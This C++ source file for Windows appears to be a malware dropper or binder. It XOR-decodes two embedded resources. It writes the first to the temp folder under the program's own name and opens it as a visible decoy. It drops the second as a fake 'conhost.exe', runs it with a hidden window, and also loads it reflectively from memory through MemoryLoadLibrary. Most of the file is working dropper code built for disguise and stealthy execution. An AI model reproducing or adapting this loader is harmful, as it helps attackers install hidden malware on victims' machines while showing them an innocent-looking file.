
#include <windows.h>
#include <stdio.h>
#include <string>
#include "memory_module.h"
#include "res1.h"
#include "res2.h"

#ifndef _SINGLE

    #define RES1 RES_1111
    #define RESLEN1 RES_1111_LEN
    #define KEY1 RES_1111_KEY

#endif

#define RES2 RES_2222
#define RESLEN2 RES_2222_LEN
#define KEY2 RES_2222_KEY


int load_without_file(u_char* data, size_t size){
    int result = 0;
    HMEMORYMODULE handle = MemoryLoadLibrary(data, size);
    if (handle == NULL)
    {
        #ifdef _DEBUG
        printf("Could not load library from memory.\n");
        MessageBoxA(NULL, "Could not load library from memory!", "error", MB_OK);
        #endif
        return -1;
    }

    result = MemoryCallEntryPoint(handle);
    if (result < 0) {
        #ifdef _DEBUG
        printf("Could not execute entry point: %d\n", result);
        MessageBoxA(NULL, "Could not execute entry point!", "error", MB_OK);
        #endif
    }else{
        #ifdef _DEBUG
        printf("Load without file success: %d\n", result);
        MessageBoxA(NULL, "Load without file success!", "error", MB_OK);
        #endif
    }
    MemoryFreeLibrary(handle);
    return result;
}

#ifndef _SINGLE
static bool endsWith(const std::string& str, const std::string& suffix)
{
    return str.size() >= suffix.size() && 0 == str.compare(str.size()-suffix.size(), suffix.size(), suffix);
}


char* write_resource(u_char* data, const char* name, DWORD dwSize){
    /*
    HANDLE hTempFile;
    DWORD  dwBufWritedSize, dwBufSize = 255;
    char* szPath = (char*)malloc(255);
    char szTempName[255];

    char lpPathBuffer[255];
    // 获取临时文件路径
    GetTempPathA(dwBufSize, lpPathBuffer);
    
    //创建临时文件
    GetTempFileNameA(lpPathBuffer,  // 临时文件目录
        (LPCSTR)"tmp",              // 临时文件的前缀
        0,                          // 创建唯一的名字
        szTempName);                // 保存名字的缓冲

    hTempFile = CreateFile((LPTSTR)szTempName,      // 文件名
        GENERIC_READ | GENERIC_WRITE,               // 用于读写操作
        0,                                          // 不共享
        NULL,                                       // 默认安全属性
        CREATE_ALWAYS,                              // 可重写已有文件
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hTempFile == INVALID_HANDLE_VALUE)
    {
        // MessageBoxA(NULL, "Could not create temporary file.", "Error", MB_OK);
        return NULL;
    }

    WriteFile(hTempFile, data, dwSize, &dwBufWritedSize, NULL);
    //关闭文件
    CloseHandle(hTempFile);

#ifdef _LANDDIR
    sprintf_s(szPath, 255, "LANDPATH\\%s", name);
#else
    sprintf_s(szPath, 255, "%s\\%s", lpPathBuffer, name);
#endif

    if (!MoveFileExA(szTempName, szPath, MOVEFILE_REPLACE_EXISTING)){
        // MessageBoxA(NULL, "Could not move temporary file.", "Error", MB_OK);
        return NULL;
    }
    return szPath;
    */
   
   char lpDirBuffer[255];
   char *lpPathBuffer = (char *)malloc(255);
   GetTempPathA(255, lpDirBuffer);
   sprintf_s(lpPathBuffer, 255, "%s\\%s", lpDirBuffer, name);

   FILE *fp = fopen(lpPathBuffer, "wb");
   fwrite(data, 1, dwSize, fp);
   fclose(fp);
   return lpPathBuffer;
}
#endif 

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR    lpCmdLine,
                     int       nCmdShow)
{
    for(int i = 0; i < RESLEN2; i++){
        RES2[i] = RES2[i] ^ KEY2;
    }

#ifndef _SINGLE

    for(int i = 0; i < RESLEN1; i++){
        RES1[i] = RES1[i] ^ KEY1;
    }

    char szapipath[MAX_PATH] = {0};

  #ifdef PROG1
    char szExe[MAX_PATH] = "EXE1FILE";
  #else
    char szExe[MAX_PATH] = {0};
    char* pbuf = NULL;

    //获取应用程序目录
    GetModuleFileNameA(NULL, szapipath, MAX_PATH);

    //获取应用程序名称
    char* szLine = strtok_s(szapipath, "\\", &pbuf);
    while (NULL != szLine)
    {
        strcpy_s(szExe, szLine);
        szLine = strtok_s(NULL, "\\", &pbuf);
    }
  #endif

    char* res1_path = write_resource(RES1, szExe, RESLEN1);
    if (res1_path){
        ShellExecute(NULL, "open", res1_path, NULL, ".", SW_SHOW);
    }

    #ifndef _UNLAND
    // MessageBoxA(NULL, "bu luodi jiazai res2!", "提示", MB_OK);
    char* res2_path = write_resource(RES2, "conhost.exe", RESLEN2);
 
    if (res2_path){
        STARTUPINFO si2 = {sizeof(si2)};
        PROCESS_INFORMATION pi2;
        si2.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si2.wShowWindow = SW_HIDE;

        BOOL bRet2 = CreateProcessA(
            NULL,       // 不在此指定可执行文件的文件名
            res2_path,  // 命令行参数
            NULL,   // 默认进程安全性
            NULL,   // 默认进程安全性
            false,  // 指定当前进程内句柄不可以被子进程继承
            false,  // 为新进程创建一个新的控制台窗口
            NULL,   // 使用本进程的环境变量
            NULL,   // 使用本进程的驱动器和目录
            &si2,
            &pi2
        );
        if(bRet2){
            // 不使用的句柄最好关掉
            CloseHandle(pi2.hThread);
            CloseHandle(pi2.hProcess);
            // printf("[+] sub process id: %d\n", pi.dwProcessId);
        }
    }
    #endif
    
#endif

    load_without_file(RES2, RESLEN2);
    return 0;
}
